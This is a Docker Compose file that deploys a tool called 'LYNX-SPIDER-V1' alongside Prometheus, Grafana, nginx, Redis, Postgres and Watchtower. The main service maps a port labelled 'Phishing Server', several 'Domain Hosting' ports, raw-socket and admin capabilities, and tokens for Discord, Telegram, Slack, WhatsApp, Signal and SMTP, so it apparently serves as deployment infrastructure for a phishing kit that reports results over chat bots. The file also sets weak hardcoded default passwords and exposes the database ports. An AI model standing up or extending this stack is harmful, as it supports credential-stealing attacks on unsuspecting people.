# ============================================
# LYNX-SPIDER-V1 - Docker Compose
# Full stack deployment with monitoring
# ============================================

version: '3.8'

networks:
  lynx-network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16

volumes:
  lynx-data:
    driver: local
  lynx-logs:
    driver: local
  lynx-reports:
    driver: local
  prometheus-data:
    driver: local
  grafana-data:
    driver: local

services:
  # ============ MAIN APPLICATION ============
  lynx-spider:
    build:
      context: .
      dockerfile: Dockerfile
      args:
        - BUILDKIT_INLINE_CACHE=1
    image: lynx-spider-v1:latest
    container_name: lynx-spider
    hostname: lynx-spider
    restart: unless-stopped
    
    # Network capabilities for raw sockets
    cap_add:
      - NET_ADMIN
      - NET_RAW
      - SYS_ADMIN
    network_mode: bridge
    networks:
      - lynx-network
    
    ports:
      - "5000:5000"      # Web Dashboard
      - "8080:8080"      # Phishing Server
      - "8000-8010:8000-8010"  # Domain Hosting
      - "9090:9090"      # Metrics
    
    environment:
      - TZ=UTC
      - LYNX_LOG_LEVEL=INFO
      - LYNX_HOME=/app
      - LYNX_CONFIG_DIR=/app/.lynx_spider
      - PYTHONUNBUFFERED=1
      
      # Bot Tokens (from secrets)
      - DISCORD_TOKEN=${DISCORD_TOKEN:-}
      - TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN:-}
      - TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID:-}
      - SLACK_BOT_TOKEN=${SLACK_BOT_TOKEN:-}
      - SLACK_APP_TOKEN=${SLACK_APP_TOKEN:-}
      - WHATSAPP_PHONE=${WHATSAPP_PHONE:-}
      - SIGNAL_PHONE=${SIGNAL_PHONE:-}
      - GOOGLE_CHAT_WEBHOOK=${GOOGLE_CHAT_WEBHOOK:-}
      
      # SMTP Configuration
      - SMTP_SERVER=${SMTP_SERVER:-}
      - SMTP_PORT=${SMTP_PORT:-587}
      - SMTP_USERNAME=${SMTP_USERNAME:-}
      - SMTP_PASSWORD=${SMTP_PASSWORD:-}
      
      # Web Dashboard
      - WEB_SECRET_KEY=${WEB_SECRET_KEY:-}
      - WEB_USERNAME=${WEB_USERNAME:-admin}
      - WEB_PASSWORD=${WEB_PASSWORD:-}
    
    volumes:
      - lynx-data:/app/.lynx_spider
      - lynx-logs:/var/log/lynx_spider
      - lynx-reports:/app/lynx_spider_reports
      - ./config:/app/config:ro
    
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:5000/api/stats"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 60s
    
    logging:
      driver: "json-file"
      options:
        max-size: "100m"
        max-file: "5"
    
    deploy:
      resources:
        limits:
          cpus: '4.0'
          memory: 4G
        reservations:
          cpus: '1.0'
          memory: 1G
    
    sysctls:
      - net.ipv4.ip_forward=1
      - net.ipv4.conf.all.route_localnet=1
    
    ulimits:
      nofile:
        soft: 65536
        hard: 65536
      nproc:
        soft: 65536
        hard: 65536

  # ============ PROMETHEUS ============
  prometheus:
    image: prom/prometheus:v2.48.0
    container_name: lynx-prometheus
    hostname: prometheus
    restart: unless-stopped
    networks:
      - lynx-network
    ports:
      - "9091:9090"
    volumes:
      - ./config/prometheus.yml:/etc/prometheus/prometheus.yml:ro
      - prometheus-data:/prometheus
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
      - '--storage.tsdb.retention.time=30d'
      - '--web.enable-lifecycle'
      - '--web.enable-admin-api'
    healthcheck:
      test: ["CMD", "wget", "-q", "--spider", "http://localhost:9090/-/healthy"]
      interval: 30s
      timeout: 10s
      retries: 3

  # ============ GRAFANA ============
  grafana:
    image: grafana/grafana:10.2.2
    container_name: lynx-grafana
    hostname: grafana
    restart: unless-stopped
    networks:
      - lynx-network
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_USER=${GRAFANA_USER:-admin}
      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD:-lynx_spider_2024}
      - GF_USERS_ALLOW_SIGN_UP=false
      - GF_INSTALL_PLUGINS=grafana-piechart-panel,grafana-worldmap-panel
      - GF_SERVER_ROOT_URL=http://localhost:3000
      - GF_DASHBOARDS_DEFAULT_HOME_DASHBOARD_PATH=/var/lib/grafana/dashboards/lynx-spider.json
    volumes:
      - grafana-data:/var/lib/grafana
      - ./grafana/dashboards:/var/lib/grafana/dashboards:ro
      - ./grafana/provisioning:/etc/grafana/provisioning:ro
    depends_on:
      - prometheus
    healthcheck:
      test: ["CMD-SHELL", "wget -q --spider http://localhost:3000/api/health || exit 1"]
      interval: 30s
      timeout: 10s
      retries: 3

  # ============ NGINX REVERSE PROXY ============
  nginx:
    image: nginx:1.25-alpine
    container_name: lynx-nginx
    hostname: nginx
    restart: unless-stopped
    networks:
      - lynx-network
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./config/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./config/certs:/etc/nginx/certs:ro
      - lynx-logs:/var/log/nginx
    depends_on:
      - lynx-spider
      - grafana
    healthcheck:
      test: ["CMD", "nginx", "-t"]
      interval: 30s
      timeout: 10s
      retries: 3

  # ============ REDIS (Cache/Sessions) ============
  redis:
    image: redis:7.2-alpine
    container_name: lynx-redis
    hostname: redis
    restart: unless-stopped
    networks:
      - lynx-network
    ports:
      - "6379:6379"
    volumes:
      - lynx-data:/data
    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD:-lynx_redis_2024}
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 30s
      timeout: 10s
      retries: 3

  # ============ POSTGRESQL (Optional) ============
  postgres:
    image: postgres:16-alpine
    container_name: lynx-postgres
    hostname: postgres
    restart: unless-stopped
    networks:
      - lynx-network
    ports:
      - "5432:5432"
    environment:
      - POSTGRES_USER=${POSTGRES_USER:-lynx}
      - POSTGRES_PASSWORD=${POSTGRES_PASSWORD:-lynx_spider_2024}
      - POSTGRES_DB=${POSTGRES_DB:-lynx_spider}
    volumes:
      - lynx-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER:-lynx}"]
      interval: 30s
      timeout: 10s
      retries: 3

  # ============ WATCHTOWER (Auto-update) ============
  watchtower:
    image: containrrr/watchtower:latest
    container_name: lynx-watchtower
    restart: unless-stopped
    networks:
      - lynx-network
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    environment:
      - WATCHTOWER_CLEANUP=true
      - WATCHTOWER_SCHEDULE=0 0 4 * * *
      - WATCHTOWER_NOTIFICATIONS=shoutrrr
    command: --interval 86400
    profiles:
      - maintenance
